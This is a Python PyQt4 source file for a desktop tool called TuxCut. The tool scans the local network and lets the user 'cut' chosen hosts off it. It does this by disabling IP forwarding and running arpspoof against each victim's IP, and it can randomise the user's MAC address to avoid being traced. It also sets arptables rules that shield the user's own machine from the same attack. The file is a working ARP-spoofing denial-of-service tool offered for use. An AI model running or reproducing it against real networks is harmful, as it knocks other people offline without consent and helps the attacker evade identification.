# -*- coding: utf-8 -*-
import os
import random
import subprocess as sp
from PyQt4 import QtCore,QtGui,uic
import pix_rc

class TuxCut(QtGui.QMainWindow):
	def __init__(self):
		QtGui.QMainWindow.__init__(self)
		uic.loadUi('ui/MainWindow.ui',self)
		
		self._gwMAC=None
		self._iface =None
		self._isProtected = False
		self._isFedora = True
		self._isQuit = False
		self._cutted_hosts = {}
		
		self._gwIP = self.default_gw()
		self._gwMAC = self.gw_mac(self._gwIP)
		self._my_mac = self.get_mymac()
		self.lbl_mac.setText(self._my_mac)
		
		self.enable_protection()
		self.list_hosts(self._gwIP)
		
		self.resume_all()
		self.show_Window()
		
		
	def show_Window(self):
		screen = QtGui.QDesktopWidget().screenGeometry()
		size =  self.geometry()
		self.move((screen.width()-size.width())/2, (screen.height()-size.height())/2)

		self.table_hosts.setColumnWidth(0,150)
		self.table_hosts.setColumnWidth(1,150)
		self.table_hosts.setColumnWidth(2,75)
		self.show()
		self.tray_icon()

	def tray_icon(self):
		self.trayicon=QtGui.QSystemTrayIcon(QtGui.QIcon(':pix/pix/tuxcut.png'))
		self.trayicon.show()
		self.menu=QtGui.QMenu()
		
		self.menu.addAction(self.action_change_mac)
		self.menu.addAction(self.action_quit)
		
		self.trayicon.setContextMenu(self.menu)
		self.trayicon.activated.connect(self.onTrayIconActivated)
		
	def onTrayIconActivated(self, reason):
		if reason == QtGui.QSystemTrayIcon.DoubleClick:
			if self.isVisible():
				self.hide()
			else:
				self.show()
				
	def closeEvent(self, event):
		'''
		This make the close button just hide the application
		'''
		if not self._isQuit:
			event.ignore()     
			if self.isVisible():
				self.hide()
		else:
			self.close()

	def default_gw(self):
		args = ['route','list']
		gwip = sp.Popen(['ip','route','list'],stdout = sp.PIPE)
		for line in  gwip.stdout:
			if 'default' in line:
				self._iface = line.split()[4]
				return  line.split()[2]
				
				

	def gw_mac(self,gwip):
		arping = sp.Popen(['arp-scan','--interface',self._iface,self._gwIP],stdout = sp.PIPE)
		for line in arping.stdout:
			if line.startswith(self._gwIP.split('.')[0]):
				return line.split()[1]
	
	def get_mymac(self):
		proc = sp.Popen(['ifconfig',self._iface],stdout = sp.PIPE)
		for line in proc.stdout:
			if line.startswith('        ether'):
				return line.split()[1]
				
	def list_hosts(self, ip):
		if self._isProtected:
			print "protected"
			#ans,unans = arping(net,timeout=3,verbose=False)
			arping = sp.Popen(['arp-scan','--interface',self._iface,ip],stdout = sp.PIPE)
		else:
			print "Not Protected"
			arping = sp.Popen(['arp-scan','--interface',self._iface,ip+'/24'],stdout = sp.PIPE)
		i=1
		for line in arping.stdout:
			if line.startswith(ip.split('.')[0]):
				print line.split()
				ip = line.split()[0]
				mac= line.split()[1]
				self.table_hosts.setRowCount(i)
				self.table_hosts.setItem(i-1,0,QtGui.QTableWidgetItem(ip))
				self.table_hosts.item(i-1,0).setIcon(QtGui.QIcon(':pix/pix/online.png'))
				self.table_hosts.setItem(i-1,1,QtGui.QTableWidgetItem(mac))
				i=i+1
					

	def enable_protection(self):    
		sp.Popen(['arptables','-F'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
		sp.Popen(['arptables','-P','IN','DROP'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
		sp.Popen(['arptables','-P','OUTPUT','DROP'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
		sp.Popen(['arptables','-A','IN','-s',self._gwIP,'--source-mac',self._gwMAC,'-j','ACCEPT'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
		sp.Popen(['arptables','-A','OUT','-d',self._gwIP,'--target-mac',self._gwMAC,'-j','ACCEPT'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
		sp.Popen(['arp','-s',self._gwIP,self._gwMAC],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
		
		self._isProtected = True
		if not self.cbox_protection.isChecked():
			self.cbox_protection.setCheckState(QtCore.Qt.Checked)
		
	def disable_protection(self):
		sp.Popen(['arptables','-P','IN','ACCEPT'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
		sp.Popen(['arptables','-P','OUT','ACCEPT'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
		sp.Popen(['arptables','-F'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
		self._isProtected = False
		
	def cut_process(self,victim_IP,row):
		## Disable ip forward
		proc = sp.Popen(['sysctl','-w','net.ipv4.ip_forward=0'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
		print self._iface
		### Start Arpspoofing the victim
		#os.system("arpspoof -i " + self.icard + " -t " + self.gwip + " " + vicip + " & > /dev/null")
		proc = sp.Popen(['arpspoof','-i',self._iface,'-t',self._gwIP,victim_IP],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
		#self._cutted_hosts.setdefault(victim_IP,proc.pid)
		self._cutted_hosts[victim_IP]=proc.pid
		self.table_hosts.item(row,0).setIcon(QtGui.QIcon(':pix/pix/offline.png'))
		print self._cutted_hosts
	
	def resume_all(self):
		sp.Popen(['sysctl','-w','net.ipv4.ip_forward=1'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
		sp.Popen(['killall','arpspoof'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
		
		
	def resume_single_host(self,victim_IP):
		if self._cutted_hosts.has_key(victim_IP):
			pid = self._cutted_hosts[victim_IP]
			print "resuming >>>> ",pid
			os.kill(pid,9)
			del self._cutted_hosts[victim_IP]
			print self._cutted_hosts
		else:
			print victim_IP,'is not attacked'
		
	def change_mac(self):
		new_MAC =':'.join(map(lambda x: "%02x" % x, [ 0x00,
													random.randint(0x00, 0x7f),
													random.randint(0x00, 0x7f),
													random.randint(0x00, 0x7f),
													random.randint(0x00, 0xff),
													random.randint(0x00, 0xff)]))
		print new_MAC
		self.lbl_mac.setText(new_MAC)
		sp.Popen(['ifconfig',self._iface,'down','hw','ether',new_MAC],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
		sp.Popen(['ifconfig',self._iface,'up'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
		
	def on_protection_changes(self):
		if self.cbox_protection.isChecked():
			self.enable_protection()
		else:
			self.disable_protection()
			
	def on_refresh_clicked(self):
		self.list_hosts(self._gwIP)
	
	def on_cut_clicked(self):
		selectedRow =  self.table_hosts.selectionModel().currentIndex().row()
		print selectedRow
		victim_IP =str(self.table_hosts.item(selectedRow,0).text())
		if not victim_IP==None:
			self.cut_process(victim_IP,selectedRow)

	def on_resume_clicked(self):
		selectedRow =  self.table_hosts.selectionModel().currentIndex().row()
		victim_IP =str(self.table_hosts.item(selectedRow,0).text())
		if not victim_IP==None:
			self.resume_single_host(victim_IP)
		
	def on_quit_triggered(self):
		self._isQuit = True
		self.closeEvent(QtGui.QCloseEvent)